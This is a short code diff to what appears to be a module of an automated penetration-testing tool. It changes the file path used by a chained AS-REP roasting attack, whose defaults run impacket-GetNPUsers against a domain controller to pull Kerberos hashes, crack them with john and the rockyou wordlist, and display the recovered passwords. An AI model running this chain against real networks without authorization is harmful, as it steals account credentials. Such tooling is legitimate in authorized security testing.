@@ -13,13 +13,13 @@ def parameters() -> dict:
             "type": str,
             "description": "The query string to execute.",
             "required": True,
-            "default": "impacket-GetNPUsers -request -format hashcat -outputfile result.txt -dc-ip $$config:DefaultConnections.targetMachine <DISTINGUISH_NAME>/"
+            "default": "impacket-GetNPUsers -request -format hashcat -outputfile cache/ldap_gnanpk_result.txt -dc-ip $$config:DefaultConnections.targetMachine <DISTINGUISH_NAME>/"
         },
         "pwCrackCmd": {
             "type": str,
             "description": "The query string to execute.",
             "required": True,
-            "default": "john --wordlist=/usr/share/wordlists/rockyou.txt result.txt"
+            "default": "john --wordlist=/usr/share/wordlists/rockyou.txt cache/ldap_gnanpk_result.txt"
         },
         "return": {
             "type": str,
@@ -78,7 +78,7 @@ def kali(distinguish_name: str, userEnumCmd: str, pwCrackCmd: str) -> tuple:
         return crackResult
 
     print("User enumeration and password cracking successful.")
-    commandStruct = ["john", "--show", "result.txt"]
+    commandStruct = ["john", "--show", "cache/ldap_gnanpk_result.txt"]
     crackResult = Host.executeShellScript(commandStruct)
     if crackResult[0] != 0:
         print("Password show failed.")
